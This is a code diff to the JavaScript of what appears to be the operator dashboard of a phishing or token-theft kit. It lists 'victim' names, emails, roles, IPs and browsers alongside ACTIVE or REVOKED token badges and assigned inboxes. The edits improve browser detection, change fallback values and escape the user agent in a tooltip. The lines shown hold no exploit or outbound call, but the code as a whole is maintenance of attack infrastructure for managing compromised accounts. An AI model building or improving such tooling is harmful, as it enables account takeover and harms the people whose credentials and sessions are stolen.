@@ -6425,8 +6425,9 @@ Assigned      : ${inboxes}
                     const name = s.victim_name || 'Unknown';
                     const email = s.victim_email || 'Unknown';
                     const role = s.victim_role || 'Member';
-                    const ip = s.victim_ip || 'N/A';
-                    const browser = s.victim_browser || 'N/A';
+                    const ip = s.victim_ip || 'Unknown';
+                    const rawUa = s.victim_browser || '';
+                    const browser = formatBrowserName(rawUa);
                     const addedStr = formatAbDate(s.created_at);
 
                     return `<tr>
@@ -6435,7 +6436,7 @@ Assigned      : ${inboxes}
                         <td class="ab-email-cell">${email}</td>
                         <td class="ab-role-cell">${role}</td>
                         <td class="ab-ip-cell">${ip}</td>
-                        <td class="ab-browser-cell" title="${browser}">${browser}</td>
+                        <td class="ab-browser-cell" title="${escapeHtml(rawUa)}">${browser}</td>
                         <td class="ab-added-cell">${addedStr}</td>
                         <td>
                             <span class="ab-token-badge ${isRevoked ? 'revoked' : 'active'}">${isRevoked ? 'REVOKED' : 'ACTIVE'}</span>
@@ -9700,13 +9701,15 @@ Assigned      : ${inboxes}
         }
 
         function formatBrowserName(ua) {
-            if (!ua || ua === 'N/A') return 'Chrome';
+            if (!ua || ua === 'N/A') return 'Unknown';
             const s = ua.toLowerCase();
             if (s.includes('edg')) return 'Edge';
-            if (s.includes('chrome')) return 'Chrome';
+            if (s.includes('opr') || s.includes('opera')) return 'Opera';
+            if (s.includes('chrome') || s.includes('crios')) return 'Chrome';
+            if (s.includes('firefox') || s.includes('fxios')) return 'Firefox';
             if (s.includes('safari') && !s.includes('chrome')) return 'Safari';
-            if (s.includes('firefox')) return 'Firefox';
-            return ua.length > 15 ? ua.substring(0, 15) : ua;
+            if (s.includes('msie') || s.includes('trident')) return 'Internet Explorer';
+            return 'Unknown';
         }
 
         async function loadSessions() {
